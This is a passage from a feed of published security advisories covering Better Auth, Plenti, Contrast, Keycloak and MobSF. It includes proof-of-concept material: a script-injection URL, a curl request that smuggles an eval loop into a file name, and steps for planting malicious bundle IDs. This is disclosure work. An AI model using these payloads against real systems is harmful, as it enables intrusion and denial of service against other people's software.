                    <title>GHSA-9x4v-xfq5-m8x5: 9.3 | <b>Better Auth URL parameter HTML Injection (Reflected Cross-Site scripting)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-9x4v-xfq5-m8x5</link>
                    <pubDate>2025-02-05T21:49:39Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-9x4v-xfq5-m8x5'>https://osv.dev/vulnerability/GHSA-9x4v-xfq5-m8x5</a><br>
                            <b>Published:</b> 2025-02-05T21:49:39Z<br>
                            <b>Severity:</b> 9.3<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/better-auth/better-auth/security/advisories/GHSA-9x4v-xfq5-m8x5'>https://github.com/better-auth/better-auth/security/advisories/GHSA-9x4v-xfq5-m8x5</a></li><li>- <a target='_blank' href='https://github.com/better-auth/better-auth/commit/7ae340e2eddad641b7e43d24d37c58a66ce9ddcf'>https://github.com/better-auth/better-auth/commit/7ae340e2eddad641b7e43d24d37c58a66ce9ddcf</a></li><li>- <a target='_blank' href='https://github.com/better-auth/better-auth'>https://github.com/better-auth/better-auth</a></li><li>- <a target='_blank' href='https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81'>https://github.com/better-auth/better-auth/blob/05ada0b79dbcac93cc04ceb79b23ca598d07830c/packages/better-auth/src/api/routes/error.ts#L81</a></li></ul><br>
                            <b>Details:</b> <b>Better Auth URL parameter HTML Injection (Reflected Cross-Site scripting)</b><br>### Summary
The better-auth `&#x2F;api&#x2F;auth&#x2F;error` page was vulnerable to HTML injection, resulting in a reflected cross-site scripting (XSS) vulnerability.

### Details
The value of `error` URL parameter was reflected as HTML on the error page: https:&#x2F;&#x2F;github.com&#x2F;better-auth&#x2F;better-auth&#x2F;blob&#x2F;05ada0b79dbcac93cc04ceb79b23ca598d07830c&#x2F;packages&#x2F;better-auth&#x2F;src&#x2F;api&#x2F;routes&#x2F;error.ts#L81

### PoC

https:&#x2F;&#x2F;demo.better-auth.com&#x2F;api&#x2F;auth&#x2F;error?error=%3Cscript%3Ealert(1)%3C&#x2F;script%3E

![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;35b1b95d-3dc9-45fd-89cd-20cd0361bb6c)

### Impact
An attacker who exploited this vulnerability by coercing a user to visit a specially-crafted URL could execute arbitrary JavaScript in the context of the user&#x27;s browser.

Because better-auth is a dependency of web applications, the impact of such a vulnerability is unknowable; it depends on the functionality of the application&#x2F;site using better-auth. I have calculated the CVSS score assuming the hypothetical victim is an administrator with elevated permissions and access.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-mj4v-hp69-27x5: 6.5 | <b>Plenti  - Code Injection - Denial of Services</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-mj4v-hp69-27x5</link>
                    <pubDate>2025-02-05T21:30:53Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-mj4v-hp69-27x5'>https://osv.dev/vulnerability/GHSA-mj4v-hp69-27x5</a><br>
                            <b>Published:</b> 2025-02-05T21:30:53Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/plentico/plenti/security/advisories/GHSA-mj4v-hp69-27x5'>https://github.com/plentico/plenti/security/advisories/GHSA-mj4v-hp69-27x5</a></li><li>- <a target='_blank' href='https://github.com/plentico/plenti/commit/c3e72a9ebbc2a03f4b0f3104becbfc25e390cb8e'>https://github.com/plentico/plenti/commit/c3e72a9ebbc2a03f4b0f3104becbfc25e390cb8e</a></li><li>- <a target='_blank' href='https://github.com/plentico/plenti'>https://github.com/plentico/plenti</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3454'>https://pkg.go.dev/vuln/GO-2025-3454</a></li></ul><br>
                            <b>Details:</b> <b>Plenti  - Code Injection - Denial of Services</b><br>### Summary
While pushing a file via postLocal method if user add javascript code in file parameter that codes can exe in v8go context.

### Details
While posting a file via postLocal, any attacker will add javascript codes to file parameter. That parameter content pass to componentSignature method after some validation. After that componentSignature parameter concat with ssrStr parameter.

&amp;lt;img width=&quot;1145&quot; alt=&quot;image&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;a08a3fe5-2fbd-4a05-b93c-2ad127e6ee81&quot; &#x2F;&amp;gt;

Last part of compileSvelte function ssrStr parameter executed in v8go engine.

&amp;lt;img width=&quot;754&quot; alt=&quot;image&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;4e622761-3324-48d6-8264-6dd6e09055af&quot; &#x2F;&amp;gt;

This cause to any one who can post a file also can push javascript code and run it. Thanks to v8go we can&#x27;t use all javascript metod, if there is no any vulnerability in v8go we can&#x27;t escape sandbox and can&#x27;t run dangerous command like opening socket etc. But we can create infinite loop and the plenti can&#x27;t response any request.

After posting a file with name &#x27;layouts&#x2F;global&#x2F;test; eval(`while(1);`);var test.svelte&#x27; we can see the ssrStr parameter include our javascript codes.

&amp;lt;img width=&quot;1023&quot; alt=&quot;image&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;369c7820-ff8a-4b9a-9cd3-6b0692f1dcf3&quot; &#x2F;&amp;gt;

**Note**: Eval usage not must I just want to ensure that it&#x27;s run javascript commands.

### PoC
**Request**
```
POST &#x2F;postlocal HTTP&#x2F;1.1
Host: localhost:3000
Content-Length: 125
Content-Type: application&#x2F;json; charset=utf-8
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;131.0.6778.140 Safari&#x2F;537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

[{&quot;action&quot;:&quot;create&quot;,&quot;encoding&quot;:&quot;text&quot;,&quot;file&quot;:&quot;layouts&#x2F;global&#x2F;test; eval(`while(1);`);var test.svelte&quot;,&quot;contents&quot;:&quot;anethole&quot;}]
```
**Video**
![PoC](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;2aca36a1-6989-4be8-a8d1-3b12960f3e9b)

**Curl Request**
```
curl --path-as-is -i -s -k -X $&#x27;POST&#x27; \
    -H $&#x27;Host: localhost:3000&#x27; -H $&#x27;Content-Length: 125&#x27; -H $&#x27;Content-Type: application&#x2F;json; charset=utf-8&#x27; -H $&#x27;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;131.0.6778.140 Safari&#x2F;537.36&#x27; -H $&#x27;Accept-Encoding: gzip, deflate, br&#x27; -H $&#x27;Connection: keep-alive&#x27; \
    --data-binary $&#x27;[{\&quot;action\&quot;:\&quot;create\&quot;,\&quot;encoding\&quot;:\&quot;text\&quot;,\&quot;file\&quot;:\&quot;layouts&#x2F;global&#x2F;test; eval(`while(1);`);var test.svelte\&quot;,\&quot;contents\&quot;:\&quot;anethole\&quot;}]&#x27; \
    $&#x27;http:&#x2F;&#x2F;localhost:3000&#x2F;postlocal&#x27;
```

### Impact
It&#x27;s a remote code execution vulnerability. Because of the sandbox we can show only Denial of Service impact. Any vulnerability will be exists in v8go that cause to escape sandbox, different impacts can be show.

**Note:** Plenti is using V8GO and V8GO is using V8 version of 11.1.278. This version released at 25 January 2023. After this date some RCE vulnerabilities founded in V8 like [CVE-2024-5830](https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-fchp-8m28-g68f),
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vqv5-385r-2hf8: 7.1 | <b>Contrast&#x27;s unauthenticated recovery allows Coordinator impersonation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vqv5-385r-2hf8</link>
                    <pubDate>2025-02-05T21:30:35Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vqv5-385r-2hf8'>https://osv.dev/vulnerability/GHSA-vqv5-385r-2hf8</a><br>
                            <b>Published:</b> 2025-02-05T21:30:35Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/edgelesssys/contrast/security/advisories/GHSA-vqv5-385r-2hf8'>https://github.com/edgelesssys/contrast/security/advisories/GHSA-vqv5-385r-2hf8</a></li><li>- <a target='_blank' href='https://github.com/edgelesssys/contrast'>https://github.com/edgelesssys/contrast</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3455'>https://pkg.go.dev/vuln/GO-2025-3455</a></li></ul><br>
                            <b>Details:</b> <b>Contrast&#x27;s unauthenticated recovery allows Coordinator impersonation</b><br>### Impact

Recovering coordinators do not verify the seed provided by the recovering party. This allows an attacker to set up a coordinator with a manifest that passes validation, but with a secret seed controlled by the attacker. 

If network traffic is redirected from the legitimate coordinator to the attacker&#x27;s coordinator, a workload owner is susceptible to impersonation if either 

* they `set` a new manifest and don&#x27;t compare the root CA cert with the existing one (this is the default of the `contrast` CLI) or
* they `verify` the coordinator and don&#x27;t compare the root CA cert with a trusted reference.

Under these circumstances, the attacker can:

* Issue certificates that chain back to the attacker coordinator&#x27;s root CA.
* Recover arbitrary workload secrets of workloads deployed after the attack.

This issue does **not** affect the following:

* secrets of the legitimate coordinator (seed, workload secrets, CA)
* integrity of workloads, even when used with the rogue coordinator
* certificates chaining back to the mesh CA

### Patches

This issue is patched in Contrast v1.4.1.

### Workarounds

The issue can be avoided by verifying the coordinator root CA cert against expectations.

* At the first `set` call, keep a copy of the CA cert returned by the coordinator.
* After subsequent `set` or `verify` calls, compare the returned CA cert with the backup copy. If it matches bit-for-bit, the coordinator is legitimate.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-g6qq-c9f9-2772: 5.7 | <b>Keycloak on Quarkus CLI option for encrypted JGroups ignored</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-g6qq-c9f9-2772</link>
                    <pubDate>2025-02-05T21:18:26Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-g6qq-c9f9-2772'>https://osv.dev/vulnerability/GHSA-g6qq-c9f9-2772</a><br>
                            <b>Published:</b> 2025-02-05T21:18:26Z<br>
                            <b>Severity:</b> 5.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/security/advisories/GHSA-g6qq-c9f9-2772'>https://github.com/keycloak/keycloak/security/advisories/GHSA-g6qq-c9f9-2772</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/issues/28750'>https://github.com/keycloak/keycloak/issues/28750</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/issues/34644'>https://github.com/keycloak/keycloak/issues/34644</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/pull/28756'>https://github.com/keycloak/keycloak/pull/28756</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/pull/34668'>https://github.com/keycloak/keycloak/pull/34668</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/commit/071032a108bd9e9fce9e66d00c36d56bd4b334df'>https://github.com/keycloak/keycloak/commit/071032a108bd9e9fce9e66d00c36d56bd4b334df</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak/commit/36defd5f33b2da5d705f179bbaa21c28b13a9996'>https://github.com/keycloak/keycloak/commit/36defd5f33b2da5d705f179bbaa21c28b13a9996</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2024-10973'>https://access.redhat.com/security/cve/CVE-2024-10973</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2324361'>https://bugzilla.redhat.com/show_bug.cgi?id=2324361</a></li><li>- <a target='_blank' href='https://github.com/keycloak/keycloak'>https://github.com/keycloak/keycloak</a></li></ul><br>
                            <b>Details:</b> <b>Keycloak on Quarkus CLI option for encrypted JGroups ignored</b><br>The env option `KC_CACHE_EMBEDDED_MTLS_ENABLED` does not work and the jgroups replication configuration is always used in plain. This option worked before in 24 and 22. More info in public issue https:&#x2F;&#x2F;github.com&#x2F;keycloak&#x2F;keycloak&#x2F;issues&#x2F;34644.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-79f6-p65j-3m2m: 6.5 | <b>MobSF Local Privilege Escalation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-79f6-p65j-3m2m</link>
                    <pubDate>2025-02-05T21:14:47Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-79f6-p65j-3m2m'>https://osv.dev/vulnerability/GHSA-79f6-p65j-3m2m</a><br>
                            <b>Published:</b> 2025-02-05T21:14:47Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-79f6-p65j-3m2m'>https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-79f6-p65j-3m2m</a></li><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83'>https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83</a></li><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF'>https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></li></ul><br>
                            <b>Details:</b> <b>MobSF Local Privilege Escalation</b><br>**Product:** Mobile Security Framework (MobSF)
**Version:** 4.3.0
**CWE-ID:** CWE-269: Improper Privilege Management
**CVSS vector v.4.0:** 7.1 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:L&#x2F;UI:N&#x2F;VC:H&#x2F;VI:N&#x2F;VA:N&#x2F;SC:L&#x2F;SI:N&#x2F;SA:N)
**CVSS vector v.3.1:** 6.5 (AV:N&#x2F;AC:L&#x2F;PR:L&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:N&#x2F;A:N)
**Description:** MobSF has a functionality of dividing users by roles. This functionality is not efficient, because any registered user can get API Token with all privileges.
**Impact:** Information Disclosure 
**Vulnerable component:** Code output component (`&#x2F;source_code`)
**Exploitation conditions:** authorized user
**Mitigation:** Remove token output in the returned js-script
**Researcher:** Egor Filatov (Positive Technologies)

## Research 

Researcher discovered zero-day vulnerability «Local Privilege Escalation» in Mobile Security Framework (MobSF).
To reproduce the vulnerability follow the steps below.

•	 A user with minimal privileges is required, so the administrator must create a user account

&amp;lt;img width=&quot;215&quot; alt=&quot;fig1&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;43e02a50-bdd9-48d9-9194-73946fcc56d9&quot; &#x2F;&amp;gt;

*Figure 1. Registration*

•	Go to static analysis of any application

&amp;lt;img width=&quot;1207&quot; alt=&quot;fig2&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;9ed141a7-a667-4a96-81fd-d81127874104&quot; &#x2F;&amp;gt;
 
*Figure 2. Static analysis*

•	Go to the code review of the selected application and get a token with all privileges in the response

&amp;lt;img width=&quot;1400&quot; alt=&quot;fig3&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;bf8b704b-9067-4861-a7d3-05ec119d9a3f&quot; &#x2F;&amp;gt;
 
*Figure 3. Token receiving*

•	This token can be used to retrieve dynamic analysis information that has not been accessed before.

![fig4](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;fda8436b-de67-45b1-bb21-6cfbc9976f79)
 
*Figure 4. No access demonstration*

&amp;lt;img width=&quot;1412&quot; alt=&quot;fig5&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;dc8f639f-36b0-47d3-807d-58ae551fcbfc&quot; &#x2F;&amp;gt;
 
*Figure 5. Token usage*

As a result, the user is able to escalate the privileges.


_______________________

### Please, assign all credits to: Egor Filatov (Positive Technologies)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-jrm8-xgf3-fwqr: 6.5 | <b>MobSF Partial Denial of Service (DoS)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-jrm8-xgf3-fwqr</link>
                    <pubDate>2025-02-05T21:09:21Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-jrm8-xgf3-fwqr'>https://osv.dev/vulnerability/GHSA-jrm8-xgf3-fwqr</a><br>
                            <b>Published:</b> 2025-02-05T21:09:21Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> py<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-jrm8-xgf3-fwqr'>https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-jrm8-xgf3-fwqr</a></li><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83'>https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83</a></li><li>- <a target='_blank' href='https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier'>https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier</a></li><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF'>https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></li><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/MobSF/urls.py#L401'>https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/MobSF/urls.py#L401</a></li></ul><br>
                            <b>Details:</b> <b>MobSF Partial Denial of Service (DoS)</b><br># Partial Denial of Service (DoS)

**Product:** MobSF
**Version:** &amp;lt; 4.3.1
**CWE-ID:** CWE-1287: Improper Validation of Specified Type of Input
**CVSS vector v.4.0:** 7.1 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:N&#x2F;UI:P&#x2F;VC:N&#x2F;VI:N&#x2F;VA:H&#x2F;SC:N&#x2F;SI:N&#x2F;SA:N)
**CVSS vector v.3.1:** 6.5 (AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:R&#x2F;S:U&#x2F;C:N&#x2F;I:N&#x2F;A:H)
**Description:**  DoS in the Scans Results and iOS Dynamic Analyzer functionality 
**Impact:** Leveraging this vulnerability would make Scans Results and iOS Dynamic Analyzer pages unavailable.
**Vulnerable component:** urls.py
https:&#x2F;&#x2F;github.com&#x2F;MobSF&#x2F;Mobile-Security-Framework-MobSF&#x2F;blob&#x2F;d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0&#x2F;mobsf&#x2F;MobSF&#x2F;urls.py#L401
**Exploitation conditions:** A malicious application was uploaded to the MobSF.
**Mitigation:** Check the uploaded bundle IDs against the regex.
**Researcher: Oleg Surnin (Positive Technologies)**

## Research

Researcher discovered zero-day vulnerability Partial Denial of Service (DoS) in MobSF in the Scans Results and iOS Dynamic Analyzer functionality.
According to Apple&#x27;s documentation for bundle ID&#x27;s, it must contain only alphanumeric characters (A–Z, a–z, and 0–9), hyphens (-), and periods (.).
(https:&#x2F;&#x2F;developer.apple.com&#x2F;documentation&#x2F;bundleresources&#x2F;information-property-list&#x2F;cfbundleidentifier)
However, an attacker can manually modify this value in `Info.plist` file and add special characters to the `&amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;&#x2F;key&amp;gt;` value.
In the `urls.py` file URL rules are defined.
https:&#x2F;&#x2F;github.com&#x2F;MobSF&#x2F;Mobile-Security-Framework-MobSF&#x2F;blob&#x2F;d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0&#x2F;mobsf&#x2F;MobSF&#x2F;urls.py#L401

*Listing 3.*
```
bundle_id_regex = r&#x27;(?P&amp;lt;bundle_id&amp;gt;([a-zA-Z0-9]{1}[\w.-]{1,255}))$&#x27;

# skip code
re_path(fr&#x27;^ios&#x2F;view_report&#x2F;{bundle_id_regex}&#x27;,
                ios_view_report.ç,
                name=&#x27;ios_view_report&#x27;),
```

When the application parses the wrong characters in the bundle ID, it encounters an error.
As a result, it will not display content and will throw a 500 error instead. The only way to make the pages work again is to manually remove the malicious application from the system.

## Vulnerability reproduction

To reproduce the vulnerability, follow the steps described below.

•	Unzip the IPA file of any iOS application.

*Listing 4. Unzipping the file*
```
unzip test.ipa
```

•	Modify the value of `&amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;&#x2F;key&amp;gt;` by adding restricted characters in the `Info.plist` file.

&amp;lt;img width=&quot;364&quot; alt=&quot;image-6&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;97dce68a-a5e2-4048-b5c8-3090146a9635&quot; &#x2F;&amp;gt;

*Figure 7. Example with `&#x27;` character`


•	Zip the modified IPA file.

*Listing 5. Zipping the file*
```
zip -r dos.ipa Payload&#x2F;
```

•	Upload the modified IPA file to Static Analysis and wait until it finished
•	Open the following pages:
`http:&#x2F;&#x2F;mobsf&#x2F;recent_scans&#x2F;`
`http:&#x2F;&#x2F;mobsf&#x2F;ios&#x2F;dynamic_analysis&#x2F;`

&amp;lt;img width=&quot;1119&quot; alt=&quot;image-7&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;a7a9ae2e-cd84-4ec8-8132-25140a209ca0&quot; &#x2F;&amp;gt;

*Figure 8. DoS Example*

&amp;lt;img width=&quot;1141&quot; alt=&quot;image-8&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;a76e03ae-b4c6-4003-a145-c1fa4c88a7a5&quot; &#x2F;&amp;gt;
 
*Figure 9. DoS Example*


_________________

### Please, assign all credits to Oleg Surnin (Positive Technologies)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-cxqq-w3x5-7ph3: 8.1 | <b>MobSF Stored Cross-Site Scripting (XSS)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-cxqq-w3x5-7ph3</link>
                    <pubDate>2025-02-05T20:56:39Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-cxqq-w3x5-7ph3'>https://osv.dev/vulnerability/GHSA-cxqq-w3x5-7ph3</a><br>
                            <b>Published:</b> 2025-02-05T20:56:39Z<br>
                            <b>Severity:</b> 8.1<br>
                            <b>Langs:</b> html<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-cxqq-w3x5-7ph3'>https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-cxqq-w3x5-7ph3</a></li><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83'>https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83</a></li><li>- <a target='_blank' href='https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier'>https://developer.apple.com/documentation/bundleresources/information-property-list/cfbundleidentifier</a></li><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF'>https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></li><li>- <a target='_blank' href='https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html#L406'>https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0/mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html#L406</a></li></ul><br>
                            <b>Details:</b> <b>MobSF Stored Cross-Site Scripting (XSS)</b><br>**Product:** MobSF
**Version:** &amp;lt; 4.3.1
**CWE-ID:** CWE-79: Improper Neutralization of Input During Web Page Generation (&#x27;Cross-site Scripting&#x27;)
**CVSS vector v.4.0:** 8.5 (AV:N&#x2F;AC:L&#x2F;AT:N&#x2F;PR:N&#x2F;UI:P&#x2F;VC:H&#x2F;VI:H&#x2F;VA:N&#x2F;SC:N&#x2F;SI:N&#x2F;SA:N)
**CVSS vector v.3.1:** 8.1 (AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:R&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:N)
**Description:** Stored XSS in the iOS Dynamic Analyzer functionality.
**Impact:** Leveraging this vulnerability would enable performing actions as users, including administrative users.
**Vulnerable component:** `dynamic_analysis.html` 
https:&#x2F;&#x2F;github.com&#x2F;MobSF&#x2F;Mobile-Security-Framework-MobSF&#x2F;blob&#x2F;d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0&#x2F;mobsf&#x2F;templates&#x2F;dynamic_analysis&#x2F;ios&#x2F;dynamic_analysis.html#L406
**Exploitation conditions:** A malicious application was uploaded to the Correlium.
**Mitigation:** Use `escapeHtml()` function on the `bundle` variable.
**Researcher: Oleg Surnin (Positive Technologies)**

## Research
Researcher discovered zero-day vulnerability Stored Cross-site Scripting (XSS) in MobSF in iOS Dynamic Analyzer functionality.
According to Apple&#x27;s documentation for bundle ID&#x27;s, it must contain only alphanumeric characters (A–Z, a–z, and 0–9), hyphens (-), and periods (.).
(https:&#x2F;&#x2F;developer.apple.com&#x2F;documentation&#x2F;bundleresources&#x2F;information-property-list&#x2F;cfbundleidentifier)
However, an attacker can manually modify this value in `Info.plist` file and add special characters to the `&amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;&#x2F;key&amp;gt;` value.
In the `dynamic_analysis.html` file you do not sanitize received bundle value from Corellium 
https:&#x2F;&#x2F;github.com&#x2F;MobSF&#x2F;Mobile-Security-Framework-MobSF&#x2F;blob&#x2F;d1d3b7a9aeb1a8c8c7c229a3455b19ade9fa8fe0&#x2F;mobsf&#x2F;templates&#x2F;dynamic_analysis&#x2F;ios&#x2F;dynamic_analysis.html#L406

&amp;lt;img width=&quot;1581&quot; alt=&quot;image&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;8400f872-46c0-406c-9dd6-97655e499b75&quot; &#x2F;&amp;gt;

*Figure 1. Unsanitized bundle*

As a result, it is possible to break the HTML context and achieve Stored XSS.

## Vulnerability reproduction

To reproduce the vulnerability, follow the steps described below.

•	Unzip the IPA file of any iOS application.
*Listing 1. Unzipping the file*
```
unzip test.ipa
```
•	Modify the value of `&amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;&#x2F;key&amp;gt;` by adding restricted characters in the `Info.plist` file.

&amp;lt;img width=&quot;560&quot; alt=&quot;image-1&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;3eedf216-45ab-4d73-9815-6b02827d36d4&quot; &#x2F;&amp;gt;

*Figure 2. Example of the modified Bundle Identifier*

•	Zip the modified IPA file.

*Listing 2. Zipping the file*
```
zip -r xss.ipa Payload&#x2F;
```
•	Upload the modified IPA file to your virtual device using the Correlium platform.
 
&amp;lt;img width=&quot;762&quot; alt=&quot;image-2&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7f3e8b0d-d1f9-4d86-b63b-9b3f9e8f1d0c&quot; &#x2F;&amp;gt;

*Figure 3. Example of the uploaded malicious application*

•	Open the XSS functionality and hover the mouse over the Uninstall button of the malicious app.

&amp;lt;img width=&quot;764&quot; alt=&quot;image-3&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;fd621574-f2c1-42be-b30a-e8e7445c6b13&quot; &#x2F;&amp;gt;

*Figure 4. Example of the &#x27;Uninstall&#x27; button*

 &amp;lt;img width=&quot;652&quot; alt=&quot;image-4&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;73526f71-6d39-4a94-98bf-8a867aa9acc7&quot; &#x2F;&amp;gt;
 
*Figure 5. Example of the XSS*
 
&amp;lt;img width=&quot;460&quot; alt=&quot;image-5&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;13e6a1fc-59be-492d-8e42-a5a8010fc4c3&quot; &#x2F;&amp;gt;

*Figure 6. Example of the vulnerable code*

___________________________

### Please, assign all credits to: Oleg Surnin (Positive Technologies)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7pq5-qcp6-mcww: 7.3 | <b>CKAN has an XSS vector in user uploaded images in group&#x2F;org and user profiles</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7pq5-qcp6-mcww</link>
                    <pubDate>2025-02-05T17:41:33Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7pq5-qcp6-mcww'>https://osv.dev/vulnerability/GHSA-7pq5-qcp6-mcww</a><br>
